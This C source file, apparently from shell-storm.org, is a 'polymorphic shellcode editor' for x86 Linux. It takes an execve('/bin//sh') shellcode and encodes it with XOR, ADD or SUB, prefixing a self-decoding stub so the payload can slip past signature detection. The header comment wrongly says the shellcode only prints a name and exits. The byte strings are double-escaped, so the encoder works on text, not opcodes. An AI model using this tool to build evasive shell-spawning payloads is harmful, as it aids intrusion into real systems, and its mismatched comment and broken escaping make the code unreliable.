/*
Title:   Polymorphic shellcode Editor for x86
Author:  Jonathan Salwan <submit AT shell-storm.org>
Date:    2010-06-14
Web:     http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/

char your_SC[] = Shellcode _write(1,"jonathan\n",9) + _exit(0)
You can change it ;)

Compile:
	# gcc -std=c99 -o editor editor.c

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


unsigned char your_SC[] = "\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80";


void syntax(void)
{
	fprintf(stdout,"\nSyntax:  ./encode <type> <value>\n\n");
	fprintf(stdout,"Type:    -xor\n");
	fprintf(stdout,"         -add\n");
	fprintf(stdout,"         -sub\n\n");
	fprintf(stdout,"Exemple: ./encode -xor 10\n\n");
	exit(1);
}

int main(int argc, char *argv[])
{
	if(argc != 3){
		syntax();
		return 1;
		}	


	if(!strcmp(argv[1], "-xor"))
		{
		fprintf(stdout,"Encode : XOR %s\n", argv[2]);
		fprintf(stdout,"Encoded: \n");

                fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
                               "\\x74\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
                               "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
                               ,strlen(your_SC), atoi(argv[2]));

		for (int i=0;i<sizeof(your_SC)-1;i++){
			your_SC[i] = your_SC[i]^atoi(argv[2]); 
			fprintf(stdout,"\\x%.2x", your_SC[i]);
			}
		fprintf(stdout,"\n");
		}
 

        if(!strcmp(argv[1], "-add"))
                {
                fprintf(stdout,"Encode : ADD %s\n", argv[2]);
                fprintf(stdout,"Encoded: \n");
 
                fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
                               "\\x6c\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
                               "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
                               ,strlen(your_SC), atoi(argv[2]));

                for (int i=0;i<sizeof(your_SC)-1;i++){
                	your_SC[i] = your_SC[i]+atoi(argv[2]);
                        fprintf(stdout,"\\x%.2x", your_SC[i]);
                        }
                fprintf(stdout,"\n");
                }

         if(!strcmp(argv[1], "-sub"))
                 {
                 fprintf(stdout,"Encode : SUB %s\n", argv[2]);
                 fprintf(stdout,"Encoded: \n");

                 fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
                                "\\x44\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
                                "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
                                ,strlen(your_SC), atoi(argv[2]));

                 for (int i=0;i<sizeof(your_SC)-1;i++){
                         your_SC[i] = your_SC[i]-atoi(argv[2]);
                         fprintf(stdout,"\\x%.2x", your_SC[i]);
                         }
                 fprintf(stdout,"\n");
                 }

return 0;
}
